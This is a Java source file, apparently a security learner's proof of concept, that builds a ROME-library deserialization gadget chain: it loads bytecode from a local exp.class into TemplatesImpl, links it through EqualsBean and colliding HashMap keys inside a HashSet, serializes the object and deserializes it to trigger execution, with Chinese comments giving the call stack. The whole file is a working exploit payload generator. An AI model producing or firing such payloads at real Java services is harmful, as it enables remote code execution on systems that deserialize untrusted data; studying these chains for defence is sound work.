package Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.HashSet;

/*
 * 这里就不是靠ToStringBean了，就是靠EqualsBean

 * invoke:497, Method (java.lang.reflect)
 * beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
 * equals:103, EqualsBean (com.sun.syndication.feed.impl)
 * equals:472, AbstractMap (java.util)
 * putVal:634, HashMap (java.util)
 * put:611, HashMap (java.util)
 * readObject:334, HashSet (java.util)
 */
public class EqualBean {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp.class"));


        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "whatever");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});

        EqualsBean equalsBean = new EqualsBean(String.class, "pop");
        HashMap hashMap = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap.put("yy",equalsBean);
        hashMap.put("zZ",templates);
        hashMap2.put("zZ",equalsBean);
        hashMap2.put("yy",templates);
        HashSet<Object> hashSet = new HashSet<>();
        hashSet.add(hashMap);
        hashSet.add(hashMap2);
        setFieldValue(equalsBean, "_beanClass", Templates.class);
        setFieldValue(equalsBean, "_obj", templates);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashSet);
        oos.close();
//        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
//        ois.close();
    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
